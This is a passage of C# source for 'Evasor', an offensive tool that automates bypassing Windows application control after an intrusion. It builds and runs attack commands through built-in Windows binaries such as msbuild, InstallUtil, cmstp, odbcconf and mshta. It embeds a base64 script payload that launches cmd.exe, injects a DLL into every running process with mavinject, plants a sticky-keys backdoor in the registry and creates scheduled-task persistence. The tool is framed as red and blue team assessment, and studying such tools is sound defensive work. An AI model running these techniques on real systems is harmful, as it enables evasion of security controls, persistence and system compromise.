using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.AccessControl;
using System.Text;
using System.Threading.Tasks;
using System.Management;
using System.Management.Automation;
using System.Management.Automation.Host;
using System.Runtime.InteropServices;
using System.Dynamic;
using System.Text.RegularExpressions;
using System.Reflection;
using System.Drawing.Imaging;
using System.Threading;

namespace Evasor
{
    class Program
    {
        static string PATH_OF_Evasor = Path.GetDirectoryName(Path.GetFullPath(Process.GetCurrentProcess().ProcessName + ".exe"));
        static List<string> list_of_potential_executables_that_can_bypass_appControl;
        static List<string> list_of_available_executables_to_bypass_appControl;
        static List<string> list_of_injectable_process;
        static List<string> List_Of_Hijckable_dlls;
        static List<string> List_Of_Replaceble_dlls;
        static List<string> List_Of_hijackble_resources;
        static System.Collections.Specialized.StringCollection log = new System.Collections.Specialized.StringCollection();
        static string file_To_Execute = string.Empty;
        static string choice = string.Empty;
        static string dll = string.Empty;
        static string[] sub_Paths;
        static List<string> proof_Of_Concepts = new List<string>();
        static List<string> proof_Of_Concepts_Pictures = new List<string>();
        static List<string> file_ends_and_starts = new List<string>();
        static List<string> file_extentions = new List<string>();
        static void Main(string[] args)
        {
            initialze_And_Set_files_content_to_original();
            list_of_potential_executables_that_can_bypass_appControl = new List<string>();
            list_of_available_executables_to_bypass_appControl = new List<string>();

            while (true)
            {
                try
                {
                    print_logo();
                    choice = Console.ReadLine();
                    switch (choice)
                    {
                        case "0":
                            Help();
                            break;
                        case "1":
                            console_AppControl_Bypass_prints();
                            break;
                        case "2":
                            console_DLL_Hijack_Bypass_prints();
                            break;
                        case "3":
                            console_Resources_Hijack_Bypass_prints();
                            break;
                        case "4":
                            console_save_report_prints();
                            break;
                        default:
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine("No such option... press (0,1,2,3,4) only");
                            Console.ForegroundColor = ConsoleColor.Gray;
                            break;
                    }
                }
                catch (Exception ex)
                { }
            }
        }

        private static void print_logo()
        {
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine();
            Console.WriteLine("                                 //////////((((((/                                   ");
            Console.WriteLine("                             .///////(///((((((((((((.                               ");
            Console.WriteLine("                           //////////(       (((((((((((                             ");
            Console.WriteLine("                         ////////(/(    /(/    ((((((((((*                           ");
            Console.WriteLine("                        ///////(//(   (((((((   (((((((((((                          ");
            Console.WriteLine("                       //////////(*  (((((((((  *(((((((((((                         ");
            Console.WriteLine("                      /////////(((((((((((((((  *((((((((((((                        ");
            Console.WriteLine("                     ////(///((                     (((((((((*                       ");
            Console.WriteLine("                     //(///(((   (((((((((((((((((   (((((((((                       ");
            Console.WriteLine("                     ////(((((   (((((((((((((((((   (((((((((                       ");
            Console.WriteLine("                     //(((((((   (((((((   (((((((   (((((((((                       ");
            Console.WriteLine("                     (((((((((   (((((((   (((((((   (((((((((                       ");
            Console.WriteLine("                     ,((((((((   ((((((     ((((((   ((((((((                        ");
            Console.WriteLine("                      ((((((((   (((((((/ /(((((((   ((((((((                        ");
            Console.WriteLine("                       (((((((   (((((((((((((((((   (((((((                         ");
            Console.WriteLine("                        ((((((                       ((((((                          ");
            Console.WriteLine("                         .((((((                   ((((((                            ");
            Console.WriteLine("                           ,(((((((((((((((((((((((((((,                             ");
            Console.WriteLine("                               (((((((((((((((((((((((                               ");
            Console.WriteLine("                                 .(((((((((((((((                                    ");
            Console.WriteLine();
            Console.WriteLine("                           Developed by Arik Kublanov.                               ");
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("                                 Version 1.0.0                                       ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("              This tool called Evasor which developed in CyberArk Labs.              ");
            Console.WriteLine("             It's free to be use and change by the cyber security Community.         ");
            Console.WriteLine("        automates scans/implement different techniques to bypass Windows APP CONTROL.");
            Console.Write("            This tool suits both ");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("red ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("and ");
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.Write("blue ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("teams in post-exploitation phase.");
            Console.WriteLine("__________________________________________________________________________________________");
            Console.BackgroundColor = ConsoleColor.Blue;
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("|Evasor Menu:                                                                             |");
            Console.WriteLine("|_________________________________________________________________________________________|");
            Console.BackgroundColor = ConsoleColor.Black;
            Console.WriteLine("|0.Help.                                                                                  |");
            Console.WriteLine("|1.Scan For Executibles That Can Bypass Windows APP CONTROL.                              |");
            Console.WriteLine("|2.Scan for Process vulnerable to DLL hijack, DLL replacement.                            |");
            Console.WriteLine("|3.Scan for resource hijacking files such as:                                             |");
            Console.WriteLine("|  xml,config,json,bat,cmd,ps1,vbs,ini,js,exe,dll,mui,msi,yaml,                           |");
            Console.WriteLine("|  lib,inf,reg,log,htm,hta,sys,rsp                                                        |");
            Console.WriteLine("|4.Create Report.                                                                         |");
            Console.WriteLine("|_________________________________________________________________________________________|");
        }

        private static void initialze_And_Set_files_content_to_original()
        {
            try
            {
                file_extentions.Add("exe");
                file_extentions.Add("dll");
                file_extentions.Add("ps1");
                file_extentions.Add("bat");
                file_extentions.Add("conf");
                file_extentions.Add("xml");
                file_extentions.Add("vbs");
                file_extentions.Add("cmd");
                file_extentions.Add("ini");
                file_extentions.Add("js");
                file_extentions.Add("json");
                file_extentions.Add("msi");
                file_extentions.Add("yaml");
                file_extentions.Add("lib");
                file_extentions.Add("inf");
                file_extentions.Add("reg");
                file_extentions.Add("log");
                file_extentions.Add("htm");
                file_extentions.Add("hta");
                file_extentions.Add("reg");
                file_extentions.Add("sys");
                file_extentions.Add("cs");
                file_extentions.Add("fsscript");
                file_extentions.Add("rsp");
                file_extentions.Add("sct");
                file_extentions.Add("This program cannot be run in DOS mode");

                foreach (string file in file_extentions)
                {
                    file_ends_and_starts.Add("." + file + "");
                    //here you can add more endings such as <,',>,},],",,
                    //like -> file_ends_and_starts.Add("." + file + "<");
                }

                file_To_Execute = @"\DLLs\Shell.inf";
                dll = @"\DLLs\cmd.dll";
                set_File_content_to_original(file_To_Execute, dll);

                file_To_Execute = @"\DLLs\Shell.vbs";
                dll = @"\DLLs\minimalist.xml";
                set_File_content_to_original(file_To_Execute, dll);

                file_To_Execute = @"\DLLs\Shell.fsscript";
                dll = @"\DLLs\cmd.dll";
                set_File_content_to_original(file_To_Execute, dll);

                file_To_Execute = @"\DLLs\Shady.inf";
                dll = @"\DLLs\minimalist.sct";
                set_File_content_to_original(file_To_Execute, dll);

                file_To_Execute = @"\DLLs\Shell.rsp";
                dll = @"\DLLs\cmd.dll";
                set_File_content_to_original(file_To_Execute, dll);
            }
            catch(Exception ex)
            { }
        }

        private static void console_save_report_prints()
        {
            try
            {
                string[] filePaths = Directory.GetFiles(PATH_OF_Evasor + @"\TEMP\");
                string[] documentsToMerge = filePaths;
                string outputFileName = (PATH_OF_Evasor + @"\REPORT\" + Process.GetCurrentProcess().ProcessName + "-Report.docx");
                Report.Merge(documentsToMerge, outputFileName, true);
                Console.WriteLine(Process.GetCurrentProcess().ProcessName + "-Report.docx created!!!");
                Console.ReadLine();
            }
            catch (Exception ex)
            { }
        }

        private static void set_File_content_to_original(string i_fileToExecute, string i_dll)
        {
            string text = File.ReadAllText(PATH_OF_Evasor + i_fileToExecute);
            text = text.Replace(PATH_OF_Evasor + i_dll, "xxxxxxxxxxxxxxxx");
            File.WriteAllText(PATH_OF_Evasor + i_fileToExecute, text);
        }

        private static void set_File_content_before_original(string i_fileToExecute, string i_dll)
        {
            string text = File.ReadAllText(PATH_OF_Evasor + i_fileToExecute);
            text = text.Replace("xxxxxxxxxxxxxxxx", PATH_OF_Evasor + i_dll);
            File.WriteAllText(PATH_OF_Evasor + i_fileToExecute, text);
        }

        private static void Scan_for_resource_hijacking()
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("______________________________________________________________________________________________________________________________");
            Console.WriteLine("|Scan for resource hijacking files (xml,config,json,bat,cmd,ps1,vbs,ini,js,exe,dll,mui,msi,yaml,lib,inf,reg,log,htm,hta,sys).|");
            Console.WriteLine("|____________________________________________________________________________________________________________________________|");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("Please wait while scanning the entire disk... It can take a while :(");
            Console.ForegroundColor = ConsoleColor.Gray;

            // Start with drives if you have to search the entire computer.
            string[] drives = System.Environment.GetLogicalDrives();

            foreach (string dr in drives)
            {
                System.IO.DriveInfo di = new System.IO.DriveInfo(dr);

                // Here we skip the drive if it is not ready to be read. This
                // is not necessarily the appropriate action in all scenarios.
                if (!di.IsReady)
                {
                    Console.WriteLine("The drive {0} could not be read", di.Name);
                    continue;
                }
                System.IO.DirectoryInfo rootDir = di.RootDirectory;
                WalkDirectoryTree(rootDir);
            }

            // Write out all the files that could not be processed.
            Console.WriteLine("Files with restricted access:");
            Console.ForegroundColor = ConsoleColor.Yellow;
            foreach (string s in log)
            {
                Console.WriteLine(s);
            }
            Console.ForegroundColor = ConsoleColor.Gray;
            // Keep the console window open in debug mode.
        }

        private static void Scan_Vulnerable_Process_To_Dll_Injection(string dll)
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("___________________________________________________");
            Console.WriteLine("|Scanning for Process vulnerable to DLL Injection!|");
            Console.WriteLine("|_________________________________________________|");
            Console.ForegroundColor = ConsoleColor.Gray;

            Process[] processlist = Process.GetProcesses();

            foreach (Process theprocess in processlist)
            {
                Process process = new Process();
                process.StartInfo.FileName = @"C:\Windows\System32\mavinject.exe";
                if (theprocess.ProcessName != Process.GetCurrentProcess().ProcessName && theprocess.ProcessName != "mavinject" && theprocess.ProcessName != Process.GetCurrentProcess().ProcessName + ".vshost")
                {
                    process.StartInfo.Arguments = " " + theprocess.Id.ToString() + " /INJECTRUNNING " + PATH_OF_Evasor + dll;
                    process.StartInfo.ErrorDialog = true;
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    process.Start();
                    process.WaitForExit();
                    if (process.ExitCode == 0)
                    {
                        string owner = GetProcessExtraInformation(theprocess.Id);
                        Console.Write("Process:{0} PID:{1} Owner:{2} is ", theprocess.ProcessName, theprocess.Id, owner);
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine("DLL Injectable ");
                        Console.ForegroundColor = ConsoleColor.Gray;
                        list_of_injectable_process.Add(theprocess.ProcessName + "^" + theprocess.Id + "^" + owner);
                        Console.ForegroundColor = ConsoleColor.DarkGreen;
                        printPremissiomns(theprocess);
                        Console.ForegroundColor = ConsoleColor.Gray;
                    }
                    else
                    {
                        Console.WriteLine("Process:{0} PID:{1} Owner:{2}", theprocess.ProcessName, theprocess.Id, GetProcessExtraInformation(theprocess.Id));
                    }
                }
            }
        }

        private static string GetProcessExtraInformation(int processId)
        {
            // Query the Win32_Process
            string query = "Select * From Win32_Process Where ProcessID = " + processId;
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(query);
            ManagementObjectCollection processList = searcher.Get();

            // Create a dynamic object to store some properties on it
            dynamic response = new ExpandoObject();
            response.Description = "";
            response.Username = "Unknown";

            foreach (ManagementObject obj in processList)
            {
                // Retrieve username 
                string[] argList = new string[] { string.Empty, string.Empty };
                int returnVal = Convert.ToInt32(obj.InvokeMethod("GetOwner", argList));
                if (returnVal == 0)
                {
                    // return Username
                    response.Username = argList[0];
                    return response.Username;
                }
                else
                {
                    return "SYSTEM | LOCAL SERVICE | NETWOTK SERVICE";
                }
            }
            return string.Empty;
        }

        private static string take_screen_shot(string imagePath)
        {
            try
            {
                var image = ScreenCapture.CaptureDesktop();
                image.Save(PATH_OF_Evasor + @"\IMAGES\" + imagePath, ImageFormat.Jpeg);
                Console.WriteLine(PATH_OF_Evasor + @"\IMAGES\" + imagePath + " Saved !!!");
                return PATH_OF_Evasor + @"\IMAGES\" + imagePath;
            }
            catch (Exception ex)
            {
                return string.Empty;
            }
        }

        private static void Help()
        {

            Console.WriteLine(@"""
Evasor Tool Description:
The Evasor is an automated security assessment tool which locates  existing executables on the Windows operating system that can be used to bypass any Application Control rules.
It is very easy to use, quick, saves time and fully automated which generates for you a report including description, screenshots and mitigations suggestions, suites for both blue and red teams in the assessment of a post - exploitation phase.

The overall goals of the tool:
1.	Locating executable files that can be used to bypass the Application Control!
   •	Retrieving the all running processes relative paths
   •	Checking every process (executable file) if it vulnerable to DLL Injection by:
1.	Running “MavInject” Microsoft component from path C:\Windows\System32\mavinject.exe with default parameters.
2.	Checking the exit code of the MavInject execution, if the process exited normally it means that the process is vulnerable to DLL Injection and can be used to bypass the Application Control.
2.	Locating processes that vulnerable to DLL Hijacking!
   •	Retrieving the all running processes
   •	For each running Process:
1.	Retrieving the loaded process modules
2.	Checking if there is a permission to write data into the directory of the working process by creating an empty file with the name of the loaded module (DLL) or overwriting an existence module file on the working process directory.
3.	If the write operation succeeds – it seems that the process is vulnerable to DLL Hijacking.
3.	Locating for potential hijackable resource files
   •	Searching for specific files on the computer by their extension.
   •	Trying to replace that files to another place in order to validate that the file can be replaceable and finally, potentially vulnerable to Resource Hijacking.
   •	Extensions: xml,config,json,bat,cmd,ps1,vbs,ini,js,exe,dll,msi,yaml,lib,inf,reg,log,htm,hta,sys,rsp
4.	Generating an automatic assessment report word document includes a description of tests and screenshots taken.""");
          
            Console.ReadLine();
        }

        private static void console_AppControl_Bypass_prints()
        {
            list_of_potential_executables_that_can_bypass_appControl.Clear();
            list_of_available_executables_to_bypass_appControl = new List<string>();
            search_for_executables_that_can_bypass_appControl();
            proof_Of_Concepts = new List<string>();
            proof_Of_Concepts_Pictures = new List<string>();
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("___________________________________________________________________________________________________________________________________________");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("The Results are:");
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("___________________________________________________________________________________________________________________________________________");
            Console.ForegroundColor = ConsoleColor.Gray;
            while (true)
            {
                int executableIndex = 0;
                foreach (string executable in list_of_available_executables_to_bypass_appControl)
                {
                    Console.WriteLine(executableIndex.ToString() + "." + executable);
                    executableIndex++;
                }
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("___________________________________________________________________________________________________________________________________________");
                Console.ForegroundColor = ConsoleColor.Gray;
                Console.WriteLine("Which executable to execute ?(0-" + (executableIndex - 1).ToString() + ")");
                int executableIndexToExecute = int.Parse(Console.ReadLine());
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("___________________________________________________________________________________________________________________________________________");
                Console.ForegroundColor = ConsoleColor.Gray;
                Process process = new Process();
                process.StartInfo.FileName = list_of_available_executables_to_bypass_appControl[executableIndexToExecute];
                Console.BackgroundColor = ConsoleColor.DarkGreen;
                Console.ForegroundColor = ConsoleColor.White;
                if (process.StartInfo.FileName.Contains("cmd")
                    || process.StartInfo.FileName.Contains("Powershell")
                    || process.StartInfo.FileName.Contains("regedit.exe")
                    || process.StartInfo.FileName.Contains("regedt32.exe"))
                {
                    Console.WriteLine("POC --> " + process.StartInfo.FileName);
                    proof_Of_Concepts.Add("POC --> " + process.StartInfo.FileName);
                }
                else if (process.StartInfo.FileName.Contains("Pubprn.vbs"))
                {
                    dll = @"\DLLs\Shell.sct";
                    process.StartInfo.Arguments = @" 127.0.0.1 script:" + PATH_OF_Evasor + dll;
                    Console.WriteLine(File.ReadAllText(PATH_OF_Evasor + dll));
                    Console.WriteLine("POC --> " + process.StartInfo.FileName + process.StartInfo.Arguments);
                    proof_Of_Concepts.Add("POC --> " + process.StartInfo.FileName + process.StartInfo.Arguments);
                }
                else if (process.StartInfo.FileName.Contains("Tracker.exe"))
                {
                    dll = @"\DLLs\cmd.dll";
                    process.StartInfo.Arguments = @" /d " + PATH_OF_Evasor + dll + " /c " + @"C:\Windows\write.exe";
                    Console.WriteLine("POC --> " + process.StartInfo.FileName + process.StartInfo.Arguments);
                    proof_Of_Concepts.Add("POC --> " + process.StartInfo.FileName + process.StartInfo.Arguments);
                }
                else if (process.StartInfo.FileName.Contains("at.exe"))
                {
                    Console.WriteLine("Enter the time like '00:00' to execute the binary?");
                    string timeToExecute = Console.ReadLine();
                    Console.WriteLine("Enter path to executible to run?");
                    file_To_Execute = Console.ReadLine();
                    process.StartInfo.Arguments = @" at " + timeToExecute + " /interactive /every:m,t,w,th,f,s,su " + file_To_Execute;
                    Console.WriteLine("POC --> " + process.StartInfo.FileName + process.StartInfo.Arguments);
                    proof_Of_Concepts.Add("POC --> " + process.StartInfo.FileName + process.StartInfo.Arguments);
                }
                else if (process.StartInfo.FileName.Contains("winrm.cmd"))
                {
                    file_To_Execute = @"quickconfig";
                    process.StartInfo.Arguments = @" " + file_To_Execute;
                    Console.WriteLine("POC --> " + process.StartInfo.FileName + process.StartInfo.Arguments);
                    proof_Of_Concepts.Add("POC --> " + process.StartInfo.FileName + process.StartInfo.Arguments);
                }
                else if (process.StartInfo.FileName.Contains("SchTasks.exe"))
                {
                    process.StartInfo.Arguments = @" /delete /TN " + "\"" + Process.GetCurrentProcess().ProcessName + "\"";
                    Console.WriteLine("Enter the time like '00:00' to execute the binary?");
                    string timeToExecute = Console.ReadLine();
                    Console.WriteLine("Enter path to executible to run?");
                    file_To_Execute = Console.ReadLine();
                    process.StartInfo.Arguments = @" /Create /SC DAILY /TN " + "\"" + Process.GetCurrentProcess().ProcessName + "\"" + " /TR " + "\"" + file_To_Execute + "\"" + " /ST " + timeToExecute;
                    Console.WriteLine("POC --> " + process.StartInfo.FileName + process.StartInfo.Arguments);
                    process.StartInfo.Arguments = @" /run /TN " + "\"" + Process.GetCurrentProcess().ProcessName + "\"";
                    Console.WriteLine("POC --> " + process.StartInfo.FileName + process.StartInfo.Arguments);
                    proof_Of_Concepts.Add("POC --> " + process.StartInfo.FileName + process.StartInfo.Arguments);
                }
                else if (process.StartInfo.FileName.Contains("ATBroker.exe"))
                {
                    Console.WriteLine("Enter path to executible to run?");
                    file_To_Execute = Console.ReadLine();
                    process.StartInfo.Arguments = @" /start malware";
                    Console.WriteLine(@"POC --> set the registry to HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware" + @" /t REG_EXPAND_SZ /v Debugger /d " + "\"" + file_To_Execute + "\"" + " /f");
                    Console.WriteLine("POC --> " + process.StartInfo.FileName + process.StartInfo.Arguments);
                    proof_Of_Concepts.Add("POC --> " + process.StartInfo.FileName + process.StartInfo.Arguments);
                }
                else if (process.StartInfo.FileName.Contains("forfiles.exe"))
                {
                    file_To_Execute = @"cmd.exe";
                    process.StartInfo.Arguments = @" /p c:\windows\system32 /m notepad.exe /c " + file_To_Execute;
                    Console.WriteLine("POC --> " + process.StartInfo.FileName + process.StartInfo.Arguments);
                    proof_Of_Concepts.Add("POC --> " + process.StartInfo.FileName + process.StartInfo.Arguments);
                }
                else if (process.StartInfo.FileName.Contains("Regsvc.exe"))
                {
                    file_To_Execute = @"\DLLs\pshell.dll";
                    process.StartInfo.Arguments = " /U " + PATH_OF_Evasor + file_To_Execute;
                    Console.WriteLine("POC --> " + process.StartInfo.FileName + process.StartInfo.Arguments);
                    proof_Of_Concepts.Add("POC --> " + process.StartInfo.FileName + process.StartInfo.Arguments);
                }
                else if (process.StartInfo.FileName.Contains("Regasm.exe"))
                {
                    file_To_Execute = @"\DLLs\pshell.dll";
                    process.StartInfo.Arguments = " /U " + PATH_OF_Evasor + file_To_Execute;
                    Console.WriteLine("POC --> " + process.StartInfo.FileName + process.StartInfo.Arguments);
                    proof_Of_Concepts.Add("POC --> " + process.StartInfo.FileName + process.StartInfo.Arguments);
                }
                else if (process.StartInfo.FileName.Contains("wmic.exe"))
                {
                    file_To_Execute = @"cmd.exe";
                    process.StartInfo.Arguments = " process" + " call create " + file_To_Execute;
                    Console.WriteLine("POC --> " + process.StartInfo.FileName + process.StartInfo.Arguments);
                    proof_Of_Concepts.Add("POC --> " + process.StartInfo.FileName + process.StartInfo.Arguments);
                }
                else if (process.StartInfo.FileName.Contains("msiexec"))
                {
                    file_To_Execute = @"\DLLs\powershell.msi";
                    process.StartInfo.Arguments = "/quiet" + " " + "/i" + " " + PATH_OF_Evasor + file_To_Execute;
                    Console.WriteLine("POC --> " + process.StartInfo.FileName + " /quiet /i " + PATH_OF_Evasor + file_To_Execute);
                    proof_Of_Concepts.Add("POC --> " + process.StartInfo.FileName + process.StartInfo.Arguments);
                }
                else if (process.StartInfo.FileName.Contains("cmstp.exe"))
                {
                    file_To_Execute = @"\DLLs\Shell.inf";
                    dll = @"\DLLs\cmd.dll";
                    set_File_content_before_original(file_To_Execute, dll);
                    Console.WriteLine(File.ReadAllText(PATH_OF_Evasor + file_To_Execute));
                    Console.WriteLine("POC --> " + process.StartInfo.FileName + " /s " + PATH_OF_Evasor + file_To_Execute);
                    process.StartInfo.Arguments = "/s" + " " + PATH_OF_Evasor + file_To_Execute;
                    proof_Of_Concepts.Add("POC --> " + process.StartInfo.FileName + process.StartInfo.Arguments);
                }
                else if (process.StartInfo.FileName.Contains("msbuild.exe"))
                {
                    file_To_Execute = @"\DLLs\Shell.csproj";
                    Console.WriteLine(File.ReadAllText(PATH_OF_Evasor + file_To_Execute));
                    process.StartInfo.Arguments = " " + PATH_OF_Evasor + file_To_Execute;
                    Console.WriteLine("POC --> " + process.StartInfo.FileName + process.StartInfo.Arguments);
                    proof_Of_Concepts.Add("POC --> " + process.StartInfo.FileName + process.StartInfo.Arguments);
                }
                else if (process.StartInfo.FileName.Contains("InstallUtil.exe"))
                {
                    file_To_Execute = @"\DLLs\pshell.dll";
                    process.StartInfo.Arguments = @"/logfile= /LogToConsole=false /U" + " " + PATH_OF_Evasor + file_To_Execute;
                    Console.WriteLine("POC --> " + process.StartInfo.FileName + " " + process.StartInfo.Arguments);
                    proof_Of_Concepts.Add("POC --> " + process.StartInfo.FileName + process.StartInfo.Arguments);
                }
                else if (process.StartInfo.FileName.Contains("dotnet.exe"))
                {
                    file_To_Execute = @"\DLLs\pshell.dll";
                    process.StartInfo.Arguments = PATH_OF_Evasor + file_To_Execute;
                    Console.WriteLine("POC --> " + process.StartInfo.FileName + " " + process.StartInfo.Arguments);
                    proof_Of_Concepts.Add("POC --> " + process.StartInfo.FileName + process.StartInfo.Arguments);
                }
                else if (process.StartInfo.FileName.Contains("csc.exe"))
                {
                    file_To_Execute = @"\DLLs\Shell.cs";
                    dll = @"\DLLs\pshell.dll ";
                    Console.WriteLine(File.ReadAllText(PATH_OF_Evasor + file_To_Execute));
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("Compile the .cs file and after that you can use InstallUtil.exe to run the DLL created.");
                    Console.ForegroundColor = ConsoleColor.Gray;
                    process.StartInfo.Arguments = @" /reference:" + "\"" + @"C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll" + "\"" + " /out:" + PATH_OF_Evasor + dll + PATH_OF_Evasor + file_To_Execute;
                    Console.WriteLine("POC --> " + process.StartInfo.FileName + process.StartInfo.Arguments);
                    proof_Of_Concepts.Add("POC --> " + process.StartInfo.FileName + process.StartInfo.Arguments);
                }
                else if (process.StartInfo.FileName.Contains("Cscript.exe") || process.StartInfo.FileName.Contains("Wscript.exe"))
                {
                    string payload = "PD94bWwgdmVyc2lvbj0nMS4wJz8+DQo8c3R5bGVzaGVldA0KeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvWFNML1RyYW5zZm9ybSIgeG1sbnM6bXM9InVybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206eHNsdCINCnhtbG5zOnVzZXI9InBsYWNlaG9sZGVyIg0KdmVyc2lvbj0iMS4wIj4NCjxvdXRwdXQgbWV0aG9kPSJ0ZXh0Ii8+DQoJPG1zOnNjcmlwdCBpbXBsZW1lbnRzLXByZWZpeD0idXNlciIgbGFuZ3VhZ2U9IkpTY3JpcHQiPg0KCTwhW0NEQVRBWw0KCXZhciByID0gbmV3IEFjdGl2ZVhPYmplY3QoIldTY3JpcHQuU2hlbGwiKS5SdW4oImNtZC5leGUiKTsNCgldXT4gPC9tczpzY3JpcHQ+DQo8L3N0eWxlc2hlZXQ+";
                    file_To_Execute = @"\DLLs\Shell.vbs";
                    dll = @"\DLLs\minimalist.xml";
                    File.WriteAllText(PATH_OF_Evasor + @"\DLLs\minimalist.xml", Base64Decode(payload));
                    Console.WriteLine(Base64Decode(payload));
                    set_File_content_before_original(file_To_Execute, dll);
                    process.StartInfo.Arguments = " " + PATH_OF_Evasor + file_To_Execute;
                    Console.WriteLine("POC --> " + process.StartInfo.FileName + process.StartInfo.Arguments);
                    proof_Of_Concepts.Add("POC --> " + process.StartInfo.FileName + process.StartInfo.Arguments);
                }
                else if (process.StartInfo.FileName.Contains("Odbcconf.exe"))
                {
                    file_To_Execute = @"\DLLs\Shell.rsp";
                    dll = @"\DLLs\cmd.dll";
                    set_File_content_before_original(file_To_Execute, dll);
                    Console.WriteLine(File.ReadAllText(PATH_OF_Evasor + file_To_Execute));
                    process.StartInfo.Arguments = " -f" + " " + PATH_OF_Evasor + file_To_Execute;
                    Console.WriteLine("POC --> " + process.StartInfo.FileName + process.StartInfo.Arguments);
                    proof_Of_Concepts.Add("POC --> " + process.StartInfo.FileName + process.StartInfo.Arguments);
                }
                else if (process.StartInfo.FileName.Contains("reg.exe"))
                {
                    Console.WriteLine("Enter path for executible to be the backdoor:");
                    file_To_Execute = Console.ReadLine();
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("Steeky keys backdoor created press 5 times the Shift button on your keyboard.");
                    Console.ForegroundColor = ConsoleColor.Gray;
                    process.StartInfo.Arguments = " ADD " + "\"" + @"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" + "\"" + @" /t REG_SZ /v Debugger /d " + "\"" + file_To_Execute + "\"" + " /f";
                    Console.WriteLine("POC --> " + process.StartInfo.FileName + process.StartInfo.Arguments);
                    proof_Of_Concepts.Add("POC --> " + process.StartInfo.FileName + process.StartInfo.Arguments);
                }
                else if (process.StartInfo.FileName.Contains("fsi.exe"))
                {
                    file_To_Execute = @"\DLLs\Shell.fsscript";
                    dll = @"\DLLs\cmd.dll";
                    set_File_content_before_original(file_To_Execute, dll);
                    Console.WriteLine(File.ReadAllText(PATH_OF_Evasor + file_To_Execute));
                    process.StartInfo.Arguments = " " + PATH_OF_Evasor + file_To_Execute;
                    Console.WriteLine("POC --> " + "\"" + process.StartInfo.FileName + "\"" + process.StartInfo.Arguments);
                    proof_Of_Concepts.Add("POC --> " + "\"" + process.StartInfo.FileName + "\"" + process.StartInfo.Arguments);
                }
                else if (process.StartInfo.FileName.Contains("rundll32.exe"))
                {
                    dll = @"\DLLs\cmd.dll,#61";
                    process.StartInfo.Arguments = " " + PATH_OF_Evasor + dll;
                    Console.WriteLine("POC --> " + process.StartInfo.FileName + process.StartInfo.Arguments);
                }
                else if (process.StartInfo.FileName.Contains("Mshta.exe"))
                {
                    file_To_Execute = @"\DLLs\Shell.hta";
                    process.StartInfo.Arguments = " " + PATH_OF_Evasor + file_To_Execute;
                    Console.WriteLine(File.ReadAllText(PATH_OF_Evasor + file_To_Execute));
                    Console.WriteLine("POC --> " + process.StartInfo.FileName + process.StartInfo.Arguments);
                }
                else if (process.StartInfo.FileName.Contains("csi.exe"))
                {
                    file_To_Execute = @"\DLLs\Shell.txt";
                    process.StartInfo.Arguments = " " + PATH_OF_Evasor + file_To_Execute;
                    Console.WriteLine(File.ReadAllText(PATH_OF_Evasor + file_To_Execute));
                    Console.WriteLine("POC --> " + process.StartInfo.FileName + process.StartInfo.Arguments);
                }
                else if (process.StartInfo.FileName.Contains("InfDefaultInstall.exe"))
                {
                    file_To_Execute = @"\DLLs\minimalist.sct";
                    dll = @"\DLLs\Shady.inf";
                    set_File_content_before_original(dll, file_To_Execute);
                    Console.WriteLine(File.ReadAllText(PATH_OF_Evasor + file_To_Execute));
                    process.StartInfo.Arguments = " " + PATH_OF_Evasor + dll;
                    Console.WriteLine("POC --> " + process.StartInfo.FileName + process.StartInfo.Arguments);
                }
                else if (process.StartInfo.FileName.Contains("Mavinject.exe"))
                {
                    dll = "";
                    list_of_injectable_process = new List<string>();
                    Console.BackgroundColor = ConsoleColor.Black;
                    Console.ForegroundColor = ConsoleColor.Gray;
                    Scan_Vulnerable_Process_To_Dll_Injection(dll);
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("___________________________________________________________________________________________________________________________________________");
                    Console.ForegroundColor = ConsoleColor.Gray;
                    Console.WriteLine("The Results are:");
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("___________________________________________________________________________________________________________________________________________");
                    Console.ForegroundColor = ConsoleColor.Gray;
                    proof_Of_Concepts = new List<string>();
                    proof_Of_Concepts_Pictures = new List<string>();
                    int k = 0;
                    foreach (string str in list_of_injectable_process)
                    {
                        sub_Paths = str.Split('^');
                        Console.WriteLine(k.ToString() + "." + sub_Paths[0] + " Owner:" + sub_Paths[2]);
                        k++;
                    }
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("___________________________________________________________________________________________________________________________________________");
                    Console.ForegroundColor = ConsoleColor.Gray;
                    Console.WriteLine("Which Process to Inject the DLL?(0-" + (k - 1).ToString() + ")");
                    int processIndex = int.Parse(Console.ReadLine());
                    Console.ForegroundColor = ConsoleColor.Yellow;
